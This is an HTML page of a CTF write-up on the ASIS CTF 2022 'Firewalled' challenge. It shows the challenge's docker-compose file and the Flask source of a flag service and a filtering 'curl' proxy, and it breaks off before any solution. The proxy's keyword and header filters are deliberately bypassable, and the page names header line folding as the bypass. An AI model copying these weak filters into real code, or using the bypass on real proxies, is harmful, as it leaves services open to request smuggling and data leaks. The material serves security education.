@@ -1,0 +1,644 @@
+<!DOCTYPE html>
+<html><head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>[ASIS CTF 2022] Firewalled - Empty</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="&#34;I made a firewalled curl&#34;. The task was about an old http feature – line folding of headers. In the end, it was solved by 15 teams." />
+	<meta property="og:image" content=""/>
+	<meta property="og:title" content="[ASIS CTF 2022] Firewalled" />
+<meta property="og:description" content="&#34;I made a firewalled curl&#34;. The task was about an old http feature – line folding of headers. In the end, it was solved by 15 teams." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/ctf/firewalled/" /><meta property="article:section" content="ctf" />
+<meta property="article:published_time" content="2022-10-16T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-10-16T00:00:00+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="[ASIS CTF 2022] Firewalled"/>
+<meta name="twitter:description" content="&#34;I made a firewalled curl&#34;. The task was about an old http feature – line folding of headers. In the end, it was solved by 15 teams."/>
+<script src="js/feather.min.js"></script>
+	
+	
+        <link href="/css/fonts.b685ac6f654695232de7b82a9143a46f9e049c8e3af3a21d9737b01f4be211d1.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="/css/main.4ddabd7503f7a39f08b1332805fc618e47fe65490f3c282a3dad46df59697a76.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="/css/dark.1b1ad67986b5fb2bdf5cdb491e362b3f0a64f1604dde010230e849731b54e308.css"   />
+	
+	
+	
+		
+		
+		<link rel="stylesheet" type="text/css" href="/css/custom.cc7145a74b085829cf7d0439eac46ecfdb25c97969e01198fb9417e77591b0b8.css">
+		
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="">Empty</a>
+	</div>
+	<nav>
+		
+		<a href="/">Home</a>
+		
+		<a href="/ctf">CTF writeups</a>
+		
+		<a href="/vulnerabilities">Vulnerabilities</a>
+		
+		<a href="/tools">Tools</a>
+		
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">[ASIS CTF 2022] Firewalled</h1>
+			<div class="meta">Posted on Oct 16, 2022</div>
+		</div>
+		
+
+		<section class="body">
+			<p><img src="/images/s2zWMsT7xJMiUbhe0JeCcZQA6M7rw8-N" alt="img"></p>
+<p>Here&rsquo;s my writeup on the Firewalled ctf challenge from ASIS CTF 2022. The task was about an old http feature – line folding of headers. In the end, it was solved by 15 teams.</p>
+<h2 id="description">Description</h2>
+<p>We&rsquo;re given a <code>docker-compose.yml</code> file with two services: <strong>flag-container</strong> and <strong>firewalled-curl</strong>. The second one is exposed to the internet via the 8000 port. Both of them are flask apps behind apache.</p>
+<p><code>docker-compose.yml:</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yml" data-lang="yml"><span style="display:flex;"><span><span style="color:#5bc4bf">version</span>: <span style="color:#48b685">&#34;3.9&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#5bc4bf">services</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#5bc4bf">flag-container</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#5bc4bf">build</span>: <span style="color:#f99b15">./flag-container</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#5bc4bf">environment</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#f99b15">FLAG=ASIS{test-flag}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#5bc4bf">restart</span>: <span style="color:#f99b15">always</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#5bc4bf">firewalled-curl</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#5bc4bf">build</span>: <span style="color:#f99b15">./firewalled-curl</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#5bc4bf">ports</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#48b685">&#34;8000:80&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#5bc4bf">restart</span>: <span style="color:#f99b15">always</span>
+</span></span></code></pre></div><details>
+<summary> Full code </summary>
+<p><code>flag-container:</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#776e71">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#5bc4bf">from</span> <span style="color:#fec418">flask</span> <span style="color:#5bc4bf">import</span> Flask,request
+</span></span><span style="display:flex;"><span><span style="color:#5bc4bf">import</span> <span style="color:#fec418">requests</span>
+</span></span><span style="display:flex;"><span><span style="color:#5bc4bf">import</span> <span style="color:#fec418">json</span>
+</span></span><span style="display:flex;"><span><span style="color:#5bc4bf">import</span> <span style="color:#fec418">os</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app <span style="color:#5bc4bf">=</span> Flask(__name__)
+</span></span><span style="display:flex;"><span>application <span style="color:#5bc4bf">=</span> app
+</span></span><span style="display:flex;"><span>flag <span style="color:#5bc4bf">=</span> os<span style="color:#5bc4bf">.</span>environ<span style="color:#5bc4bf">.</span>get(<span style="color:#48b685">&#39;FLAG&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#5bc4bf">@app</span><span style="color:#5bc4bf">.</span>route(<span style="color:#48b685">&#39;/flag&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#815ba4">def</span> <span style="color:#06b6ef">index</span>():
+</span></span><span style="display:flex;"><span>	args <span style="color:#5bc4bf">=</span> request<span style="color:#5bc4bf">.</span>args<span style="color:#5bc4bf">.</span>get(<span style="color:#48b685">&#39;args&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">try</span>:
+</span></span><span style="display:flex;"><span>		r <span style="color:#5bc4bf">=</span> requests<span style="color:#5bc4bf">.</span>post(<span style="color:#48b685">&#39;http://firewalled-curl/req&#39;</span>,json<span style="color:#5bc4bf">=</span>json<span style="color:#5bc4bf">.</span>loads(args))<span style="color:#5bc4bf">.</span>json()
+</span></span><span style="display:flex;"><span>		<span style="color:#815ba4">if</span> <span style="color:#48b685">&#39;request&#39;</span> <span style="color:#5bc4bf">in</span> r <span style="color:#5bc4bf">and</span> <span style="color:#48b685">&#39;flag&#39;</span> <span style="color:#5bc4bf">in</span> r[<span style="color:#48b685">&#39;request&#39;</span>] <span style="color:#5bc4bf">and</span> <span style="color:#48b685">&#39;flag&#39;</span> <span style="color:#5bc4bf">in</span> request<span style="color:#5bc4bf">.</span>headers[<span style="color:#48b685">&#39;X-Request&#39;</span>]:
+</span></span><span style="display:flex;"><span>			<span style="color:#815ba4">return</span> flag
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">except</span>:
+</span></span><span style="display:flex;"><span>		<span style="color:#815ba4">pass</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">return</span> <span style="color:#48b685">&#39;No flag for you :(&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#815ba4">if</span>(__name__ <span style="color:#5bc4bf">==</span> <span style="color:#48b685">&#39;__main__&#39;</span>):
+</span></span><span style="display:flex;"><span>	app<span style="color:#5bc4bf">.</span>run(port<span style="color:#5bc4bf">=</span><span style="color:#f99b15">8000</span>)
+</span></span></code></pre></div><p><code>firewalled-curl:</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#776e71">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#5bc4bf">from</span> <span style="color:#fec418">flask</span> <span style="color:#5bc4bf">import</span> Flask,Response,request
+</span></span><span style="display:flex;"><span><span style="color:#5bc4bf">import</span> <span style="color:#fec418">time</span>
+</span></span><span style="display:flex;"><span><span style="color:#5bc4bf">import</span> <span style="color:#fec418">socket</span>
+</span></span><span style="display:flex;"><span><span style="color:#5bc4bf">import</span> <span style="color:#fec418">re</span>
+</span></span><span style="display:flex;"><span><span style="color:#5bc4bf">import</span> <span style="color:#fec418">base64</span>
+</span></span><span style="display:flex;"><span><span style="color:#5bc4bf">import</span> <span style="color:#fec418">json</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>isSafeAscii <span style="color:#5bc4bf">=</span> <span style="color:#815ba4">lambda</span> s : <span style="color:#5bc4bf">not</span> re<span style="color:#5bc4bf">.</span>search(<span style="color:#48b685">r</span><span style="color:#48b685">&#39;[^\x20-\x7F]&#39;</span>,s)
+</span></span><span style="display:flex;"><span>isSafeHeader <span style="color:#5bc4bf">=</span> <span style="color:#815ba4">lambda</span> s : isSafeAscii(s)
+</span></span><span style="display:flex;"><span>isSafePath <span style="color:#5bc4bf">=</span> <span style="color:#815ba4">lambda</span> s : s[<span style="color:#f99b15">0</span>] <span style="color:#5bc4bf">==</span> <span style="color:#48b685">&#39;/&#39;</span> <span style="color:#5bc4bf">and</span> isSafeAscii(s) <span style="color:#5bc4bf">and</span> <span style="color:#48b685">&#39; &#39;</span> <span style="color:#5bc4bf">not</span> <span style="color:#5bc4bf">in</span> s
+</span></span><span style="display:flex;"><span>badHeaderNames <span style="color:#5bc4bf">=</span> [<span style="color:#48b685">&#39;encoding&#39;</span>,<span style="color:#48b685">&#39;type&#39;</span>,<span style="color:#48b685">&#39;charset&#39;</span>]
+</span></span><span style="display:flex;"><span>unsafeKeywords <span style="color:#5bc4bf">=</span> [<span style="color:#48b685">&#34;flag&#34;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app <span style="color:#5bc4bf">=</span> Flask(__name__)
+</span></span><span style="display:flex;"><span>application <span style="color:#5bc4bf">=</span> app
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#815ba4">def</span> <span style="color:#06b6ef">isJson</span>(s):
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">try</span>:
+</span></span><span style="display:flex;"><span>	    json<span style="color:#5bc4bf">.</span>loads(s)
+</span></span><span style="display:flex;"><span>	    <span style="color:#815ba4">return</span> <span style="color:#815ba4">True</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">except</span>:
+</span></span><span style="display:flex;"><span>		<span style="color:#815ba4">return</span> <span style="color:#815ba4">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#815ba4">def</span> <span style="color:#06b6ef">checkHostname</span>(name):
+</span></span><span style="display:flex;"><span>	name <span style="color:#5bc4bf">=</span> str(name)
+</span></span><span style="display:flex;"><span>	port <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#39;80&#39;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">if</span>(<span style="color:#48b685">&#39;:&#39;</span> <span style="color:#5bc4bf">in</span> name):
+</span></span><span style="display:flex;"><span>		sp <span style="color:#5bc4bf">=</span> name<span style="color:#5bc4bf">.</span>split(<span style="color:#48b685">&#39;:&#39;</span>)
+</span></span><span style="display:flex;"><span>		name <span style="color:#5bc4bf">=</span> sp[<span style="color:#f99b15">0</span>]
+</span></span><span style="display:flex;"><span>		port <span style="color:#5bc4bf">=</span> sp[<span style="color:#f99b15">1</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">if</span>(
+</span></span><span style="display:flex;"><span>		(
+</span></span><span style="display:flex;"><span>		re<span style="color:#5bc4bf">.</span>search(<span style="color:#48b685">r</span><span style="color:#48b685">&#39;^[a-z0-9][a-z0-9\.-]+$&#39;</span>,name) <span style="color:#5bc4bf">or</span>
+</span></span><span style="display:flex;"><span>		re<span style="color:#5bc4bf">.</span>search(<span style="color:#48b685">r</span><span style="color:#48b685">&#39;^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$&#39;</span>,name)
+</span></span><span style="display:flex;"><span>		) <span style="color:#5bc4bf">and</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#f99b15">0</span> <span style="color:#5bc4bf">&lt;</span> int(port) <span style="color:#5bc4bf">&lt;</span> <span style="color:#f99b15">0x10000</span>
+</span></span><span style="display:flex;"><span>	):
+</span></span><span style="display:flex;"><span>		<span style="color:#815ba4">return</span> name,int(port)
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">return</span> <span style="color:#ef6155">Exception</span>(<span style="color:#48b685">&#39;unsafe port&#39;</span>),<span style="color:#ef6155">Exception</span>(<span style="color:#48b685">&#39;unsafe hostname&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#815ba4">def</span> <span style="color:#06b6ef">recvuntil</span>(sock,u):
+</span></span><span style="display:flex;"><span>	r <span style="color:#5bc4bf">=</span> <span style="color:#48b685">b</span><span style="color:#48b685">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">while</span>(r[<span style="color:#5bc4bf">-</span>len(u):] <span style="color:#5bc4bf">!=</span> u):
+</span></span><span style="display:flex;"><span>		r <span style="color:#5bc4bf">+=</span> sock<span style="color:#5bc4bf">.</span>recv(<span style="color:#f99b15">1</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">return</span> r
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#815ba4">def</span> <span style="color:#06b6ef">checkHeaders</span>(headers):
+</span></span><span style="display:flex;"><span>	newHeaders <span style="color:#5bc4bf">=</span> {}
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">if</span>(type(headers) <span style="color:#5bc4bf">is</span> <span style="color:#5bc4bf">not</span> dict):
+</span></span><span style="display:flex;"><span>		<span style="color:#815ba4">return</span> <span style="color:#ef6155">Exception</span>(<span style="color:#48b685">&#39;unsafe headers&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">for</span> headerName <span style="color:#5bc4bf">in</span> headers:
+</span></span><span style="display:flex;"><span>		headerValue <span style="color:#5bc4bf">=</span> str(headers[headerName])
+</span></span><span style="display:flex;"><span>		<span style="color:#815ba4">if</span> (isSafeHeader(headerName) <span style="color:#5bc4bf">and</span> <span style="color:#48b685">&#39;:&#39;</span> <span style="color:#5bc4bf">not</span> <span style="color:#5bc4bf">in</span> headerName) <span style="color:#5bc4bf">and</span> isSafeHeader(headerValue):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			isBad <span style="color:#5bc4bf">=</span> <span style="color:#815ba4">False</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#815ba4">for</span> badHeaderName <span style="color:#5bc4bf">in</span> badHeaderNames:
+</span></span><span style="display:flex;"><span>				<span style="color:#815ba4">if</span>(badHeaderName <span style="color:#5bc4bf">in</span> headerName<span style="color:#5bc4bf">.</span>lower()):
+</span></span><span style="display:flex;"><span>					isBad <span style="color:#5bc4bf">=</span> <span style="color:#815ba4">True</span>
+</span></span><span style="display:flex;"><span>					<span style="color:#815ba4">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			<span style="color:#815ba4">if</span>(<span style="color:#48b685">&#34;flag&#34;</span> <span style="color:#5bc4bf">in</span> headerValue<span style="color:#5bc4bf">.</span>lower()):
+</span></span><span style="display:flex;"><span>				isBad <span style="color:#5bc4bf">=</span> <span style="color:#815ba4">True</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#815ba4">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			<span style="color:#815ba4">if</span>(isBad):
+</span></span><span style="display:flex;"><span>				<span style="color:#815ba4">return</span> <span style="color:#ef6155">Exception</span>(<span style="color:#48b685">&#39;bad headers&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			newHeaders[headerName] <span style="color:#5bc4bf">=</span> headerValue
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">return</span> newHeaders
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#815ba4">def</span> <span style="color:#06b6ef">checkMethod</span>(method):
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">if</span>(method <span style="color:#5bc4bf">in</span> [<span style="color:#48b685">&#39;GET&#39;</span>,<span style="color:#48b685">&#39;POST&#39;</span>]):
+</span></span><span style="display:flex;"><span>		<span style="color:#815ba4">return</span> method
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">return</span> <span style="color:#ef6155">Exception</span>(<span style="color:#48b685">&#39;unsafe method&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#815ba4">def</span> <span style="color:#06b6ef">checkPath</span>(path):
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">if</span>(isSafePath(path)):
+</span></span><span style="display:flex;"><span>		<span style="color:#815ba4">return</span> path
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">return</span> <span style="color:#ef6155">Exception</span>(<span style="color:#48b685">&#39;unsafe path&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#815ba4">def</span> <span style="color:#06b6ef">checkJson</span>(j):
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">if</span>(type(j) <span style="color:#5bc4bf">==</span> str):
+</span></span><span style="display:flex;"><span>		<span style="color:#815ba4">for</span> u <span style="color:#5bc4bf">in</span> unsafeKeywords:
+</span></span><span style="display:flex;"><span>			<span style="color:#815ba4">if</span>(u <span style="color:#5bc4bf">in</span> j<span style="color:#5bc4bf">.</span>lower()):
+</span></span><span style="display:flex;"><span>				<span style="color:#815ba4">return</span> <span style="color:#815ba4">False</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">elif</span>(type(j) <span style="color:#5bc4bf">==</span> list):
+</span></span><span style="display:flex;"><span>		<span style="color:#815ba4">for</span> entry <span style="color:#5bc4bf">in</span> j:
+</span></span><span style="display:flex;"><span>			<span style="color:#815ba4">if</span>(<span style="color:#5bc4bf">not</span> checkJson(entry)):
+</span></span><span style="display:flex;"><span>				<span style="color:#815ba4">return</span> <span style="color:#815ba4">False</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">elif</span>(type(j) <span style="color:#5bc4bf">==</span> dict):
+</span></span><span style="display:flex;"><span>		<span style="color:#815ba4">for</span> entry <span style="color:#5bc4bf">in</span> j:
+</span></span><span style="display:flex;"><span>			<span style="color:#815ba4">if</span>(<span style="color:#5bc4bf">not</span> checkJson(j[entry])):
+</span></span><span style="display:flex;"><span>				<span style="color:#815ba4">return</span> <span style="color:#815ba4">False</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">else</span>:
+</span></span><span style="display:flex;"><span>		<span style="color:#815ba4">return</span> <span style="color:#815ba4">True</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">return</span> <span style="color:#815ba4">True</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#5bc4bf">@app</span><span style="color:#5bc4bf">.</span>route(<span style="color:#48b685">&#39;/req&#39;</span>,methods<span style="color:#5bc4bf">=</span>[<span style="color:#48b685">&#39;POST&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#815ba4">def</span> <span style="color:#06b6ef">req</span>():
+</span></span><span style="display:flex;"><span>	params <span style="color:#5bc4bf">=</span> request<span style="color:#5bc4bf">.</span>json
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	hostname,port <span style="color:#5bc4bf">=</span> checkHostname(params[<span style="color:#48b685">&#39;host&#39;</span>])
+</span></span><span style="display:flex;"><span>	headers <span style="color:#5bc4bf">=</span> checkHeaders(params[<span style="color:#48b685">&#39;headers&#39;</span>])
+</span></span><span style="display:flex;"><span>	method <span style="color:#5bc4bf">=</span> checkMethod(params[<span style="color:#48b685">&#39;method&#39;</span>])
+</span></span><span style="display:flex;"><span>	path <span style="color:#5bc4bf">=</span> checkPath(params[<span style="color:#48b685">&#39;path&#39;</span>])
+</span></span><span style="display:flex;"><span>	returnJson <span style="color:#5bc4bf">=</span> bool(params[<span style="color:#48b685">&#39;returnJson&#39;</span>])
+</span></span><span style="display:flex;"><span>	body <span style="color:#5bc4bf">=</span> <span style="color:#815ba4">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">for</span> p <span style="color:#5bc4bf">in</span> [hostname,headers,body,method,path]:
+</span></span><span style="display:flex;"><span>		<span style="color:#815ba4">if</span>(isinstance(p,<span style="color:#ef6155">Exception</span>)):
+</span></span><span style="display:flex;"><span>			<span style="color:#815ba4">return</span> {<span style="color:#48b685">&#39;success&#39;</span>:<span style="color:#815ba4">False</span>,<span style="color:#48b685">&#39;error&#39;</span>:str(p)}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">if</span>(method <span style="color:#5bc4bf">==</span> <span style="color:#48b685">&#39;POST&#39;</span>):
+</span></span><span style="display:flex;"><span>		body <span style="color:#5bc4bf">=</span> str(params[<span style="color:#48b685">&#39;body&#39;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	httpRequest <span style="color:#5bc4bf">=</span> <span style="color:#48b685">f</span><span style="color:#48b685">&#39;</span><span style="color:#f99b15">{</span>method<span style="color:#f99b15">}</span><span style="color:#48b685"> </span><span style="color:#f99b15">{</span>path<span style="color:#f99b15">}</span><span style="color:#48b685"> HTTP/1.1</span><span style="color:#f99b15">\r\n</span><span style="color:#48b685">&#39;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">if</span>(port <span style="color:#5bc4bf">==</span> <span style="color:#f99b15">80</span>):
+</span></span><span style="display:flex;"><span>		httpRequest<span style="color:#5bc4bf">+=</span> <span style="color:#48b685">f</span><span style="color:#48b685">&#39;Host: </span><span style="color:#f99b15">{</span>hostname<span style="color:#f99b15">}</span><span style="color:#f99b15">\r\n</span><span style="color:#48b685">&#39;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">else</span>:
+</span></span><span style="display:flex;"><span>		httpRequest<span style="color:#5bc4bf">+=</span> <span style="color:#48b685">f</span><span style="color:#48b685">&#39;Host: </span><span style="color:#f99b15">{</span>hostname<span style="color:#f99b15">}</span><span style="color:#48b685">:</span><span style="color:#f99b15">{</span>port<span style="color:#f99b15">}</span><span style="color:#f99b15">\r\n</span><span style="color:#48b685">&#39;</span>
+</span></span><span style="display:flex;"><span>	httpRequest<span style="color:#5bc4bf">+=</span> <span style="color:#48b685">f</span><span style="color:#48b685">&#39;Connection: close</span><span style="color:#f99b15">\r\n</span><span style="color:#48b685">&#39;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">if</span>(body):
+</span></span><span style="display:flex;"><span>		httpRequest<span style="color:#5bc4bf">+=</span> <span style="color:#48b685">f</span><span style="color:#48b685">&#39;Content-Length: </span><span style="color:#f99b15">{</span>str(len(body))<span style="color:#f99b15">}</span><span style="color:#f99b15">\r\n</span><span style="color:#48b685">&#39;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">for</span> headerName <span style="color:#5bc4bf">in</span> headers:
+</span></span><span style="display:flex;"><span>		httpRequest<span style="color:#5bc4bf">+=</span> <span style="color:#48b685">f</span><span style="color:#48b685">&#39;</span><span style="color:#f99b15">{</span>headerName<span style="color:#f99b15">}</span><span style="color:#48b685">: </span><span style="color:#f99b15">{</span>headers[headerName]<span style="color:#f99b15">}</span><span style="color:#f99b15">\r\n</span><span style="color:#48b685">&#39;</span>
+</span></span><span style="display:flex;"><span>	httpRequest <span style="color:#5bc4bf">+=</span> <span style="color:#48b685">&#39;</span><span style="color:#f99b15">\r\n</span><span style="color:#48b685">&#39;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">if</span>(body):
+</span></span><span style="display:flex;"><span>		httpRequest <span style="color:#5bc4bf">+=</span> body
+</span></span><span style="display:flex;"><span>	httpRequest <span style="color:#5bc4bf">=</span> httpRequest<span style="color:#5bc4bf">.</span>encode()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">with</span> socket<span style="color:#5bc4bf">.</span>socket(socket<span style="color:#5bc4bf">.</span>AF_INET,socket<span style="color:#5bc4bf">.</span>SOCK_STREAM) <span style="color:#815ba4">as</span> sock:
+</span></span><span style="display:flex;"><span>		sock<span style="color:#5bc4bf">.</span>settimeout(<span style="color:#f99b15">1</span>)
+</span></span><span style="display:flex;"><span>		sock<span style="color:#5bc4bf">.</span>connect((hostname,port))
+</span></span><span style="display:flex;"><span>		sock<span style="color:#5bc4bf">.</span>sendall(httpRequest)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		statusCode <span style="color:#5bc4bf">=</span> int(recvuntil(sock,<span style="color:#48b685">b</span><span style="color:#48b685">&#39;</span><span style="color:#f99b15">\n</span><span style="color:#48b685">&#39;</span>)<span style="color:#5bc4bf">.</span>split(<span style="color:#48b685">b</span><span style="color:#48b685">&#39; &#39;</span>)[<span style="color:#f99b15">1</span>])
+</span></span><span style="display:flex;"><span>		headers <span style="color:#5bc4bf">=</span> {}
+</span></span><span style="display:flex;"><span>		line <span style="color:#5bc4bf">=</span> recvuntil(sock,<span style="color:#48b685">b</span><span style="color:#48b685">&#39;</span><span style="color:#f99b15">\n</span><span style="color:#48b685">&#39;</span>)<span style="color:#5bc4bf">.</span>strip()
+</span></span><span style="display:flex;"><span>		<span style="color:#815ba4">while</span>(line):
+</span></span><span style="display:flex;"><span>			headerName <span style="color:#5bc4bf">=</span> line[:line<span style="color:#5bc4bf">.</span>index(<span style="color:#48b685">b</span><span style="color:#48b685">&#39;:&#39;</span>)]<span style="color:#5bc4bf">.</span>strip()<span style="color:#5bc4bf">.</span>decode()
+</span></span><span style="display:flex;"><span>			headerValue <span style="color:#5bc4bf">=</span> line[line<span style="color:#5bc4bf">.</span>index(<span style="color:#48b685">b</span><span style="color:#48b685">&#39;:&#39;</span>)<span style="color:#5bc4bf">+</span><span style="color:#f99b15">1</span>:]<span style="color:#5bc4bf">.</span>strip()<span style="color:#5bc4bf">.</span>decode()
+</span></span><span style="display:flex;"><span>			<span style="color:#815ba4">if</span>(isSafeHeader(headerName) <span style="color:#5bc4bf">and</span> isSafeHeader(headerValue)):
+</span></span><span style="display:flex;"><span>				headers[headerName] <span style="color:#5bc4bf">=</span> headerValue
+</span></span><span style="display:flex;"><span>			line <span style="color:#5bc4bf">=</span> recvuntil(sock,<span style="color:#48b685">b</span><span style="color:#48b685">&#39;</span><span style="color:#f99b15">\n</span><span style="color:#48b685">&#39;</span>)<span style="color:#5bc4bf">.</span>strip()
+</span></span><span style="display:flex;"><span>		bodyLength <span style="color:#5bc4bf">=</span> min(int(headers[<span style="color:#48b685">&#39;Content-Length&#39;</span>]),<span style="color:#f99b15">0x1000</span>)
+</span></span><span style="display:flex;"><span>		body <span style="color:#5bc4bf">=</span> <span style="color:#48b685">b</span><span style="color:#48b685">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#815ba4">while</span>(len(body) <span style="color:#5bc4bf">!=</span> bodyLength):
+</span></span><span style="display:flex;"><span>			body <span style="color:#5bc4bf">+=</span> sock<span style="color:#5bc4bf">.</span>recv(<span style="color:#f99b15">1</span>)
+</span></span><span style="display:flex;"><span>		sock<span style="color:#5bc4bf">.</span>close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#815ba4">if</span>(isJson(body<span style="color:#5bc4bf">.</span>decode())):
+</span></span><span style="display:flex;"><span>			<span style="color:#815ba4">if</span>(<span style="color:#5bc4bf">not</span> checkJson(json<span style="color:#5bc4bf">.</span>loads(body<span style="color:#5bc4bf">.</span>decode()))):
+</span></span><span style="display:flex;"><span>				<span style="color:#815ba4">return</span> {<span style="color:#48b685">&#39;success&#39;</span>:<span style="color:#815ba4">False</span>,<span style="color:#48b685">&#39;error&#39;</span>:<span style="color:#48b685">&#39;unsafe json&#39;</span>}
+</span></span><span style="display:flex;"><span>			headers[<span style="color:#48b685">&#39;Content-Type&#39;</span>] <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#39;application/json&#39;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#815ba4">else</span>:
+</span></span><span style="display:flex;"><span>			headers[<span style="color:#48b685">&#39;Content-Type&#39;</span>] <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#39;application/octet-stream&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#815ba4">if</span>(returnJson):
+</span></span><span style="display:flex;"><span>			body <span style="color:#5bc4bf">=</span> base64<span style="color:#5bc4bf">.</span>b64encode(body)<span style="color:#5bc4bf">.</span>decode()
+</span></span><span style="display:flex;"><span>			<span style="color:#815ba4">return</span> {<span style="color:#48b685">&#39;statusCode&#39;</span>:statusCode,<span style="color:#48b685">&#39;headers&#39;</span>:headers,<span style="color:#48b685">&#39;body&#39;</span>:body,<span style="color:#48b685">&#39;req&#39;</span>:httpRequest<span style="color:#5bc4bf">.</span>decode()}
